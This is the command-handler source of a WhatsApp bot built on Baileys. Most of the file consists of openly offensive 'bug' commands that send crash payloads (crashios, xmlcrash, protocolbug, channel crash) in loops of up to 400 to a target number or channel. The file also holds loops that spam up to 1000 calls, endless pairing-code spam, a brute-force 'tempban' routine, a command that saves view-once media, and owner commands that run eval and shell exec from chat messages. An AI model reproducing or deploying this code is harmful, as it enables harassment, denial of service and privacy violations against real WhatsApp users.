case 'readviewoncemessage': {
  if (!m.quoted) return ReplyMulti("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return ReplyMulti("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return ReplyMulti("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await client.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await client.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break
case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return ReplyMulti(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return ReplyMulti('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return ReplyMulti('Failed to download media!');
    }

    const uploadImage = require('./system/Data1');
    const uploadFile = require('./system/Data2');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return ReplyMulti('Failed to upload media!');
    }

    ReplyMulti(`${link}`)
}
break
case 'sticker': case 's': {
  if (!quoted) return ReplyMulti(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await client.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyMulti('max 10s');
    
    let media = await quoted.download();
    let encmedia = await client.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyMulti(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break
case "joingc": case "join": {
if (!isCreator) return ReplyMulti(mess.owner);
if (!q) return ReplyMulti(example("linkgcnya"))
let result = args[0].split("https://chat.whatsapp.com/")[1];
let target = await client.groupAcceptInvite(result);
ReplyMulti(`Berhasil bergabung ke grup ✅`)
}
//=================================================//
// Command Group
//=================================================//

break;
case 'hidetag': {
  if (!isCreator) return;
  if (!m.isGroup) return;

  const groupMetadata = await client.groupMetadata(from);
  const participants = groupMetadata.participants.map(p => p.id);

  const messageText = q ? q : 'Zoro Always Stay In Here';

  await client.sendMessage(from, {
    text: messageText,
    mentions: participants
  }, { quoted: null });
}
//=================================================//
// Command Bug —Vip
//=================================================//
break
case 'blank':
case 'xblank': {
if (!isCreator && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 1; i++) {
console.log(chalk.green(`© Zoro - Xblank
𖥂 Blank : ${i}/1
𖥂 Target : ${target}`));
await invico2(client, target);
await letterCrash(client, target);
await StickerPack6(client, target);
}
}
break
case 'xml':
case 'xmlcrash': {
if (!isCreator && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 50; i++) {
console.log(chalk.green(`© Zoro - XmlUi
𖥂 XmlUi : ${i}/50
𖥂 Target : ${target}`));
await XMLUI(client, target);
}
}
break
case 'crashios': {
if (!isCreator && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 50; i++) {
console.log(chalk.green(`© Zoro - IoS
𖥂 IoS : ${i}/50
𖥂 Target : ${target}`));
await NewStellarStuck(client, target);
await CrashIOS(client, target);
}
}
break
case 'crashapp':
case 'melefic':
case 'xjids': {
    if (!isCreator && !isVip) return ReplyMulti(mess.premium);
    if (!q) return ReplyMulti(example("120363xxxxxxx"))

    if (!/^\d{15,}$/.test(q)) return ReplyMulti("❌ Gunakan hanya ID channel yang valid (120363xxxxxxx)");

    let target = `${q}@newsletter`;

    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${target}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`;
    ReplyMulti(teks);
    ////////// Sending Bugs //////////
    for (let i = 0; i < 1; i++) {
    await ChannelCrash1(client, target);
    await ChannelCrash2(client, target);
    await ChannelCrash3(client, target);
    }
    ////////// Succes Bugs //////////
}
break
case 'xgroup': {
  if (!isCreator && !isVip) return ReplyMulti(mess.premium);
  if (!q) return ReplyMulti(example("https://chat.whatsapp.com/"));

  try {
    await sleep(1000);
    ReplyMulti(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
    let target = await client.groupAcceptInvite(result);

for (let i = 0; i < 1; i++) {
await StallerPackFreze(client, target);
await invico2(client, target);
await letterCrash(client, target);
await StickerPack6(client, target);

}
  } catch (err) {
    console.error(err);
    ReplyMulti("Failed to send virus. Make sure the number or link is valid.");
  }
}
//=================================================//
// Command Bug
//=================================================//
break
case 'bulldozer': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *𝐗𝐝𝐨𝐳𝐞𝐫 𝐐𝐮𝐨𝐭𝐚*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 10; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Bulldozer : ${i}/400
𖥂 Target : ${target}`));
await bulldozer(client, target);
}
}
break
case 'invisxaudio': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *𝐈𝐧𝐯𝐢𝐬𝐀𝐮𝐝𝐢𝐨*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 10; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 InvisXAudio : ${i}/400
𖥂 Target : ${target}`));
await invisxaudio(client, target, false);
}
}
break
case 'invisxlocation': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *𝐗𝐋𝐨𝐱𝐚𝐭𝐢𝐨𝐧 𝐈𝐧𝐯𝐢𝐬*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 10; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 InvisXLocation : ${i}/400
𖥂 Target : ${target}`));
await invisxlocation(client, target);
}
}
break
case 'protocolbug1': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug1 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug1(client, target, false);
}
}
break
case 'protocolbug2': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug2 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug2(client, target, false);
}
}
break
case 'protocolbug3': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug3 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug3(client, target, true);
}
}
break
case 'protocolbug5': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug5 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug5(client, target, false);
}
}
break
case 'protocolbug6': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug6 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug6(client, target);
}
}
break
case 'protocolbug7': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug7 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug7(client, target, false);
}
}
break
case 'protocolbug8': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 400; i++) {
console.log(chalk.green(`© Zoro - Invisible
𖥂 Protocolbug8 : ${i}/400
𖥂 Target : ${target}`));
await protocolbug8(client, target, false);
}
}
break
case 'spamcall': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Zoro - Calling
𖥂 CallMsg : ${i}/1000
𖥂 Target : ${target}`));
await sendOfferCall(client, target);
}
}
break
case 'spamvidcall': {
if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
if (!q) return ReplyMulti(example("628xxx or tag @user"))

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMulti(example("62xxx"))
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*

\`—( Note )\`
> Please pause after sending bug`
ReplyMulti(teks)

for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© Zoro - Calling
𖥂 CallMsg : ${i}/1000
𖥂 Target : ${target}`));
await sendOfferVideoCall(client, target);
}
}
break
case 'spamcode':
case 'spampair': {
    if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
    if (!q) return ReplyMulti(example("62xxx|200"));

    const [rawNumber, maxPerSession = "200"] = q.split("|");
    const target = rawNumber.replace(/[^0-9]/g, '').trim();
    const maxPerLoop = parseInt(maxPerSession);
    const delayBetweenRequests = 1500;
    const delayBetweenSession = 5000;
    const spamLimitPerSession = 50;

    await ReplyMulti(`</> 𝙎𝙩𝙖𝙧𝙩 𝙎𝙥𝙖𝙢 𝘾𝙤𝙙𝙚〽️\n➤ Number: ${target}\n➤ Total: ∞ until manually stopped`);

    const {
        default: makeWaSocket,
        useMultiFileAuthState,
        fetchLatestBaileysVersion
    } = require('@whiskeysockets/baileys');
    const pino = require('pino');

    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

    let totalSent = 0;
    let sessionIndex = 1;

    while (true) {
        const sessionName = `SpamCodeSession-${sessionIndex}`;
        const { state } = await useMultiFileAuthState(sessionName);
        const { version } = await fetchLatestBaileysVersion();

        const client = makeWaSocket({
            auth: state,
            version,
            logger: pino({ level: 'fatal' })
        });

        console.log(`\n[+] Start Session: ${sessionName}`);

        for (let i = 0; i < spamLimitPerSession; i++) {
            try {
                await sleep(delayBetweenRequests);
                const code = await client.requestPairingCode(target);
                totalSent++;
                console.log(`[#${totalSent}] ✅ Sent to: ${target} - Code: ${code}`);
            } catch (err) {
                console.log(`[#${totalSent}] ❌ Error: ${err.message}`);
                break;
            }
        }

        await client.ws.close();
        console.log(`[×] End Session: ${sessionName} — Rotating...\n`);

        sessionIndex++;
        await sleep(delayBetweenSession);
    }
}
break
case 'tempband':
case 'tempban': {
    if (!isCreator && !isPremium && !isVip) return ReplyMulti(mess.premium);
    if (args.length < 1) return ReplyMulti(example("62xxx"));
    
    const xtarget = args[0];
    if (!/^62\d{8,}$/.test(xtarget)) return ReplyMulti(example("62xxx"));
    
    const countryCode = '62';
    const cleanedNumber = xtarget.replace('@s.whatsapp.net', '').trim();
    const merge = `${countryCode}${cleanedNumber}`;
    const Mention = merge + '@s.whatsapp.net';

    await ReplyMulti(`</> 𝐒𝐮𝐜𝐜𝐞𝐬 𝐓𝐞𝐦𝐩𝐁𝐚𝐧〽️`);

    try {
        const { useMultiFileAuthState } = require('@whiskeysockets/baileys');
        const { state } = await useMultiFileAuthState('./Band');

        // Simulasi request kode (tidak tersedia di Baileys)
        const requestCode = await fakeRequestCode(cleanedNumber); // Fungsi ini harus kamu buat sendiri
        console.log('Request Code Sent:', requestCode);

        for (let i = 0; i < 10000; i++) {
            try {
                const code = `${Math.floor(100 + Math.random() * 900)}-${Math.floor(100 + Math.random() * 900)}`;
                await fakeRegisterCode(code); // Fungsi fiktif
            } catch (err) {
                console.log('Tried Code:', code);
            }
        }
    } catch (err) {
        console.error(err);
    }
}
break
case "dev":
case "devoloper":
case "owner":
case "xowner": {
  let namaown = `𝐑𝐢𝐳𝐱𝐕𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ`
  let NoOwn = `6289501955295`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:𝐓𝐡𝐞𝐄𝐱𝐭𝐨𝐫𝐝𝐢𝐭𝐜𝐯𝐙𝐚𝐩🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  client.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break;

default:
if (budy.startsWith('<')) {
if (!isCreator) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}
}
if (budy.startsWith('$')) {
if (!isCreator) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})